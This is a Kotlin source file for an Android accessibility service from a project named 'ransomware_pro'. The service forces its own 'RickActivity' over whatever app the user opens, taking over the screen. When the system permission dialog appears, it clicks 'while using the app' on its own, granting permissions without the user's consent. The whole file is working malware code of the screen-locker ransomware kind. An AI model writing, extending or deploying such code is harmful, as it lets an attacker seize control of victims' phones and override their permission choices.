package com.example.ransomware_pro.services

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.util.Log
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.ransomware_pro.activities.RickActivity
import com.example.ransomware_pro.utils.Logger


class MyAccessibilityService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        Logger.debug("in onAccessibilityEvent " + event?.packageName)

        //launch rick activity
        if (event?.packageName != applicationContext.packageName && event?.packageName != "com.android.permissioncontroller") {
            val intent: Intent = Intent(this, RickActivity::class.java)
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        }
        //allow permission by click on allow button
        if (event?.packageName == "com.android.permissioncontroller" && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            Logger.info("here")

//            if(event.getSource()!=null) {
//                event.getSource()!!.findAccessibilityNodeInfosByText("while using the app")[0].performAction(
//                    AccessibilityNodeInfo.ACTION_CLICK
//                )
//            }

            val nodeInfo = event.source

            if (nodeInfo == null) {
                return
            }

            val list = nodeInfo
                .findAccessibilityNodeInfosByText("while using the app")
            for (node in list) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }
    }

    override fun onInterrupt() {
        Logger.debug("in onInterrupt")
    }

    //while using the app
    //Only this time
    //Dont't Allow

    override fun onServiceConnected() {
        super.onServiceConnected()
        Logger.debug("in onServiceConnected")

    }

    override fun onKeyEvent(event: KeyEvent?): Boolean {
        Logger.debug("in onKeyEvent")
        return super.onKeyEvent(event)
    }
}